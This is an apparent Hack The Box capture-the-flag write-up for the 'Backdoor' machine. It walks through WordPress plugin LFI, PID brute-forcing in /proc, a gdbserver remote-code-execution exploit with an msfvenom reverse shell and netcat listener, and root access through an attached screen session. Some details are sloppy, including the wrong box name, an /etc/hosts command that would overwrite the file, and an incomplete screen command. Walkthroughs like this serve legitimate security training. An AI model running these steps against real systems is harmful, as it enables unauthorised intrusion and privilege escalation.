![[Pasted image 20211028192537.png]]

# [BACKDOOR- BOX]     
Hi folks, today I am going to solve a hard rated hack the box machine,spider created by hkabubaker17.So without any further intro, let's jump in.

# common enumeration
## Nmap
 *TCP over SSH
  *HTTP Default page
  *Host 8.2p1 Ubuntu 4ubuntu0.3
#### code-Nmap
```bash
nmap -sC -sV  -A -oN nmap/paper 10.10.11.125
```
 
 
#### output
![[Backdoor/Backdoor png/nmap.png]]

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-17 16:43 EDT
Nmap scan report for 10.10.11.125
Host is up (0.34s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)
|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)
|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((ubuntu)) 
|_http-server-header: Apache/2.4.41 (ubuntu)
|_http-generator: wordpress 5.8.1
|_http-title: Backdoor &8211; Real-life
443/tcp open  krb54?
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
```

Three ports are open:
port[22]-ssh
port[80]-http
port[443]-ssl/http

## Default Page
lets check the default page  but first we need to add the hostname to ``/etc/hosts ``file and browse the page.
#### code-/etc/hosts
```bash
echo 10.10.11.125 backdoor.htb > /etc/hosts
```

http://backdoor.htb

![[web.png]]

Then i decide to to search for vunerability of wordpress 5.8.1 using searchsploit and googling from in the internet in searchsploit i found three vunerability.

#### code -searchsploit
```bash
searchsploit wordpress 5.8.1  
```

#### Output
![[aearch.png]]

so i stated doing some background code execution using Wpscan to find more about this site

#### code-wpscan
```bash
wpscan --url http://10.10.11.125 -e ap --plugins-detection aggressive --scope
```

#### Output
![[wpscan.png]]

wpscan discovered that the Akismet plugin is being used, having one vulnerability with path [_http://backdoor.htb/wp-content/plugins/akismet/_](http://backdoor.htb/wp-content/plugins/akismet/)

#### Output
![[akiste.png]]

Visit the path and go one directory down and we have an **ebook** plugin here.
#### Output

![[ebookpng.png]]

Now search for the ebook plugin [**exploits**](https://www.exploit-db.com/exploits/39575).
#### Output

![[plugin.png]]

So, we have LFI vulnerability present here. Let's try it.

#### Output
![[wpconfig.png]]


The config file has some credentials. I tried to log in but it’s incorrect. Let’s start burpsuite to perform LFI.

#### Output

![[etc.png]]

We are able to see ``/etc/passwd ``file but there is nothing useful. So then I tried to search RCE(REMOTE CODE  EXECUTION) via LFI and after lots of searches and research, I finally came across a [**blog**](https://zsahi.wordpress.com/2018/09/10/file-inclusion/) that says we can brute force the `PID` in the ``/proc/ directory``. So, ``/proc/[PID]/cmdline`` in Linux is basically representing a currently running process. Learn more about /proc/ directory [**here**](https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html)**.**

start the brute process using burp to brute force the PID so i created a payload with numbers from 1 to 1000 and started the payload. **_pid_** is the process ID of a currently running process

![[burp.png]]

So as we can see `gdbserver` is running in port 1337.so basically **gdbserver** is a program that allows you to run GDB on a different machine than the one which is running the program being debugged.so we are going to communicate with the "host" GDB via TCP.The "port:1337" argument means that we are expecting to see a TCP connection from "host" to local TCP port 1337.

**--once**
           By default, **gdbserver** keeps the listening TCP port open, so
           that additional connections are possible.  However, if you
           start "gdbserver" with the **--once** option, it will stop
           listening for any further connection attempts after
           connecting to the first GDB session.

so i decide to look for `gbserver exploit` and found a python  [**RCE**](https://www.exploit-db.com/exploits/50539)

#### Output

![[gbserver.png]]

## Enumeration and Injecting

so i decide to open a new file ``exploit.py`` and copied pasted the code and runned it to see the outcame

#### Output

![[expli.png]]

as you can see we need to follow the folowing steps: replace your LHOST with you tun0 ip address  and LHOST of your desired choice :

#### code-steps  
```bash
1. Generate shellcode with msfvenom:
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.100 LPORT=9001 PrependFork=true -o rev.bin

2.make rev.bin Executable
$ chmod +x rev.bin

3. Listen with Netcat:
$ nc -nlvp 9001

4. Run the exploit use the box ip and the pid port 1337:
$ python3 exploit.py 10.10.11.125:1337 rev.bin
```

![[rev.png]]


Sucessful  Just by following the steps above i got the **shell** 

#### Output

![[exploit.png]]

## Takeover
 After geting the reverse shell we have to do some adjusment to our reverse shell to make it ready for using by doing a stty escalation to get an interactive shell:
 #### code-stty
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 [ctrl] + z
 stty raw -echo
 fg [Enter] two times
 ```
 
 Then setting the TERM so that you are able to clean the terminal:
 ```bash
 export TERM=xterm
 ```
  
  Having the shell as a regular user  we can find the ``user.txt`` 

## Privilege Escalation
so i decide to use **linpeas**  which is s **a well-known enumeration script that searches for possible paths to escalate privileges on Linux/Unix* targets**. https://github.com/carlospolop/PEASS-ng use the latest i downloaded linpeas to my local machine and fowarded it to the box 

use this code to get your ip  tun and use that ip to foward linpeas to the box

#### code-tun0
```shell
ip addr show dev tun0
```

start a python server to where you have downloaded your linpeas you can use your own port

#### code-server
```shell
python3 -m http.server 
```

Then to the box use this code to to get linpeas.sh

#### code-linpeas
```shell
wget ip/linpeas.sh
```

after running the script you will see something like **screen** keyword in red color. This caught my attention.

#### output

![[Backdoor/Backdoor png/linpeas.png]]

Just to confirm I started `pspy32` to see if it’s running as a `cronjob` or not and yes it is! after a certain number of sleep.

#### output

![[pspy.png]]

so i decide to resarch for screen exploit and found an exploit of GNU 4.5  and our screen is 4.8 so it did not have a use but it gave me an idea to learn about screens.so i fond someting about [**attaching and detarching from screen session**](http://www.softpanorama.org/Utilities/Screen/attaching_and_detaching.shtml)
 i found out that `-x`  is used to join a screen that is already attached
 
‘-x’

Attach to a session which is already attached elsewhere (multi-display mode). `Screen` refuses to attach from within itself. But when cascading multiple screens, loops are not detected; take care.

#### invoking-screen
Now in this case a session is already running as root so, we can get attached to that session for getting root access.so we 

```bash
screen root/root
```

#### output
![[screen.png]]

and we get the root acess we have succesful pwned the machine

![[Backdoor/Backdoor png/root.png]]

Successfully obtained the flag file with root privileges

    -------------------------END successful attack @leshack98----------------------
